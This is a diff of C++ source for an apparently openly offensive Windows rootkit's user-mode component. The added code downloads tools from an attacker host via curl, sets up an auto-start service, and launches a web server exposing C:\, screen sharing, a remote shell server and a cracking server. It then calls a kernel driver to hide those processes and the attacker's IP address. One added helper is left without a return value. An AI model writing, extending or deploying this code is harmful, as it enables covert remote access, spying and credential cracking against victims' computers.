@@ -1,4 +1,5 @@
 #include "helpers.h"
+#include "requests.h"
 #pragma warning(disable : 4244)
 #pragma warning(disable : 4267)
 #define MEDIUM_AS_SOURCE_MODULE "mymyymym"
@@ -37,7 +38,7 @@ int GeneralHelpers::WcharpToCharp(char* ConvertedString, const WCHAR* ConvertStr
 }
 
 
-std::wstring GetCurrentPath() {
+std::wstring GeneralHelpers::GetCurrentPath() {
     TCHAR PathBuffer[MAX_PATH] = { 0 };
     GetModuleFileName(NULL, PathBuffer, MAX_PATH);
     std::wstring::size_type PathEndPos = std::wstring(PathBuffer).find_last_of(L"\\/");
@@ -211,6 +212,65 @@ BOOL GeneralHelpers::PerformCommand(const char* CommandArr[], const char* Replac
 }
 
 
+BOOL GeneralHelpers::DoesPathEndWithFile(char* DirPath) {
+    char LastPathPart[MAX_PATH] = { 0 };
+    int PathIndex = 0;
+    if (DirPath == NULL) {
+        return FALSE;  // No path
+    }
+    PathIndex = strlen(DirPath) - 1;
+    while (DirPath[PathIndex] != '\\' && PathIndex >= 0) {
+        PathIndex--;
+    }
+    if (PathIndex < 0) {
+        return FALSE;  // invalid path, no '\' found in path
+    }
+    RtlCopyMemory(LastPathPart, (PVOID)((ULONG64)DirPath + PathIndex + 1), 
+        strlen(DirPath) - (PathIndex + 1));  // Move one character forward
+
+}
+
+
+HANDLE GeneralHelpers::StartThread(PVOID ThreadAddress, PVOID ThreadParameters) {
+    HANDLE CurrentThreadHandle = INVALID_HANDLE_VALUE;
+    SECURITY_ATTRIBUTES ThreadAttributes = { 0 };
+    ThreadAttributes.bInheritHandle = FALSE;
+    ThreadAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
+    ThreadAttributes.lpSecurityDescriptor = NULL;
+    CurrentThreadHandle = CreateThread(&ThreadAttributes,
+        0,
+        (LPTHREAD_START_ROUTINE)ThreadAddress,
+        ThreadParameters,
+        0,
+        NULL);
+
+    return CurrentThreadHandle;
+}
+
+
+ULONG GeneralHelpers::CalculateAddressValue(char* IpAddress) {
+    BYTE IpFields[4] = { 0 };
+    BYTE CurrentField = 0;
+    int CurrentFieldIndex = 0;
+    if (IpAddress == NULL) {
+        return 0;
+    }
+    for (int CurrentDigit = 0; CurrentDigit < strlen(IpAddress); CurrentDigit++) {
+        if (IpAddress[CurrentDigit] == '.') {
+            IpFields[CurrentFieldIndex] = CurrentField;
+            CurrentField = 0;
+            CurrentFieldIndex++;
+        }
+        else {
+            CurrentField *= 10;
+            CurrentField += (IpAddress[CurrentDigit] - 0x30);
+        }
+    }
+    IpFields[3] = CurrentField;
+    return *(ULONG*)(IpFields);
+}
+
+
 int RootkitInstall::VerifyDependencies(const char* AttackerIp) {
     const char* FileCommands[] = { "if not exist C:\\nosusfolder\\verysus mkdir C:\\nosusfolder\\verysus && ",
         "curl http://~:8080/WebScraper/x64/Release/WebScraper.exe --output C:\\nosusfolder\\verysus\\WebScraper.exe && ",
@@ -233,6 +293,7 @@ BOOL WINAPI RootkitInstall::CtrlHandler(DWORD ControlType) {
         system("sc stop RootAuto");
         system("sc delete RootAuto");
         system("sc create RootAuto type=own start=auto binPath=\"C:\\nosusfolder\\verysus\\AutoStart.exe\"");
+        system("echo handler triggered > c:\\handler.txt");
         return TRUE;
     default:
         return FALSE;
@@ -354,4 +415,180 @@ ROOTKIT_UNEXERR RequestHelpers::ResolvePID(char* ModuleName, ULONG64* ProcessId)
         return relevantpid;
     }
     return successful;
+}
+
+
+int MajorOperation::TerminateMedium(NETWORK_INFO* SndInfo, HANDLE* PipeHandle, BOOL* IsValidPipe, int ReturnStatus) {
+    if (SndInfo != NULL) {
+        closesocket(SndInfo->AsoSock);
+    }
+    if (IsValidPipe != NULL) {
+        *IsValidPipe = FALSE;
+    }
+    if (PipeHandle != NULL) {
+        DisconnectNamedPipe(*PipeHandle);
+        if (*PipeHandle != INVALID_HANDLE_VALUE) {
+            CloseHandle(*PipeHandle);
+            *PipeHandle = INVALID_HANDLE_VALUE;
+        }
+    }
+    return ReturnStatus;
+}
+
+
+DWORD MajorOperation::ConnectToNamedPipe(HANDLE* PipeHandle, LogFile* MediumLog, BOOL* IsValidPipe) {
+    DWORD LastError = 0;
+    *IsValidPipe = ConnectNamedPipe(*PipeHandle, NULL);
+    if (!*IsValidPipe) {
+        LastError = GetLastError();
+        if (LastError == ERROR_PIPE_CONNECTED) {
+            *IsValidPipe = TRUE;
+            RequestHelpers::LogMessage("MainMedium pipe - driver already connected to pipe between creating it and connecting to it!\n", MediumLog, FALSE, 0);
+        }
+        else {
+            RequestHelpers::LogMessage("MainMedium pipe - error while connecting to pipe\n", MediumLog, TRUE, LastError);
+            if (*PipeHandle != INVALID_HANDLE_VALUE) {
+                CloseHandle(*PipeHandle);
+                *PipeHandle = INVALID_HANDLE_VALUE;
+            }
+        }
+    }
+    else {
+        RequestHelpers::LogMessage("MainMedium pipe - driver connected to pipe like expected\n", MediumLog, FALSE, 0);
+    }
+    return LastError;
+}
+
+
+void MajorOperation::ClientServiceThread(PVOID ServiceParameters) {
+    switch ((ULONG64)ServiceParameters) {
+    case 0x1000:
+        system("cd C:\\ && C:\\nosusfolder\\verysus\\MinPython\\Scripts\\python.exe -m http.server 8050"); break;
+    
+    case 0x2000:
+        system("C:\\nosusfolder\\verysus\\MinPython\\Scripts\\python.exe "
+            "C:\\nosusfolder\\verysus\\ExtraTools\\ScreenShare\\screenshare.py -p 8070"); break;
+
+    case 0x4000:
+        system("C:\\nosusfolder\\verysus\\MinPython\\Scripts\\python.exe "
+            "C:\\nosusfolder\\verysus\\ExtraTools\\Shell\\ShellServer.py"); break;
+    
+    case 0x8000:
+        system("C:\\nosusfolder\\verysus\\MinPython\\Scripts\\python.exe "
+            "C:\\nosusfolder\\verysus\\ExtraTools\\Cracking\\CrackServer.py"); break;
+    
+    default:
+        break;
+    }
+}
+
+
+BOOL MajorOperation::InitializeClientServices() {
+    /*
+    Assumptions:
+    1) all files were installed accordingly (in addition to minimal-python.zip)
+    2) minimal-python.zip was only installed, not extracted
+    */
+    HANDLE CurrentThreadHandle = INVALID_HANDLE_VALUE;
+
+
+    // Install python quietly if not installed already:
+    if (system("C:\\nosusfolder\\verysus\\MinPython\\pythoninstaller.exe /quiet") == -1) {
+        return FALSE;
+    }
+
+
+    // Unzip minimal-python.zip and start the web server:
+    if (system("cd C:\\nosusfolder\\verysus\\MinPython && "
+        "tar -xf C:\\nosusfolder\\verysus\\MinPython\\minpython.zip") == -1) {
+        return FALSE;
+    }
+    CurrentThreadHandle = GeneralHelpers::StartThread(&MajorOperation::ClientServiceThread,
+        (PVOID)0x1000);
+    if (CurrentThreadHandle == INVALID_HANDLE_VALUE) {
+        return FALSE;
+    }
+
+    
+    // Unzip the screenshare files and run them with python:
+    //if (system("tar -xf C:\\nosusfolder\\verysus\\ExtraTools\\ScreenShare\\screenshare.zip") == -1) {
+    //    return FALSE;
+    //}
+    CurrentThreadHandle = GeneralHelpers::StartThread(&MajorOperation::ClientServiceThread,
+        (PVOID)0x2000);
+    if (CurrentThreadHandle == INVALID_HANDLE_VALUE) {
+        return FALSE;
+    }
+
+
+    // Activate shell server:
+    CurrentThreadHandle = GeneralHelpers::StartThread(&MajorOperation::ClientServiceThread,
+        (PVOID)0x4000);
+    if (CurrentThreadHandle == INVALID_HANDLE_VALUE) {
+        return FALSE;
+    }
+
+
+    // Extract cracking tool and activate the cracking server:
+    if (system("cd C:\\nosusfolder\\verysus\\ExtraTools\\Cracking && "
+        "tar -xf C:\\nosusfolder\\verysus\\ExtraTools\\Cracking\\crack.zip") == -1) {
+        return FALSE;
+    }
+    CurrentThreadHandle = GeneralHelpers::StartThread(&MajorOperation::ClientServiceThread,
+        (PVOID)0x8000);
+    if (CurrentThreadHandle == INVALID_HANDLE_VALUE) {
+        return FALSE;
+    }
+    return TRUE;
+}
+
+
+BOOL MajorOperation::HideClientServices(HANDLE* PipeHandle, LogFile* MediumLog, ULONG AddressInfo) {
+    ROOTKIT_MEMORY RootkInst = { 0 };
+    int DriverResult = 0;
+    const char* ProcessToHide = "python.exe";
+
+
+    // Hide 8 python programs (shell,webserver,cracking and screenshare * 2 as 2 instances are launched):
+    for (int PythonHideCount = 0; PythonHideCount < 8; PythonHideCount++) {
+        if (RequestHelpers::ResolvePID((char*)ProcessToHide, &RootkInst.MainPID) != successful) {
+            return FALSE;
+        }
+        RootkInst.Operation = RKOP_HIDEPROC;
+        RootkInst.MdlName = (char*)ProcessToHide;
+        RootkInst.MedPID = (ULONG64)GetCurrentProcessId();
+        RootkInst.Reserved = (PVOID)HideProcess;
+        RootkInst.Unexpected = successful;
+        DriverResult = DriverCalls::CallKernelDriver(0, &RootkInst, FALSE, PipeHandle, MediumLog);
+        if (DriverResult != 1 || RootkInst.IsFlexible || RootkInst.Status != 0 ||
+            RootkInst.StatusCode != ROOTKSTATUS_SUCCESS) {
+            return FALSE;  // No operation was done, STATUS_SUCCESS = (NTSTATUS)0
+        }
+    }
+
+
+    // Hide the attacker IP address (and also add 0):
+    RootkInst.Operation = RKOP_HIDEADDR;
+    RootkInst.SemiPID = (ULONG64)AddressInfo;
+    RootkInst.Buffer = (PVOID)AddressInfo;
+    RootkInst.Reserved = 0;
+    RootkInst.Size = HideAddress;
+    RootkInst.Unexpected = successful;
+    DriverResult = DriverCalls::CallKernelDriver(0, &RootkInst, FALSE, PipeHandle, MediumLog);
+    if (DriverResult != 1 || RootkInst.IsFlexible || RootkInst.Status != 0 ||
+        RootkInst.StatusCode != ROOTKSTATUS_SUCCESS) {
+        return FALSE;  // No operation was done, STATUS_SUCCESS = (NTSTATUS)0
+    }
+    RootkInst.Operation = RKOP_HIDEADDR;
+    RootkInst.SemiPID = 0;
+    RootkInst.Buffer = 0;
+    RootkInst.Reserved = 0;
+    RootkInst.Size = HideAddress;
+    RootkInst.Unexpected = successful;
+    DriverResult = DriverCalls::CallKernelDriver(0, &RootkInst, FALSE, PipeHandle, MediumLog);
+    if (DriverResult != 1 || RootkInst.IsFlexible || RootkInst.Status != 0 ||
+        RootkInst.StatusCode != ROOTKSTATUS_SUCCESS) {
+        return FALSE;  // No operation was done, STATUS_SUCCESS = (NTSTATUS)0
+    }
+    return TRUE;
 }
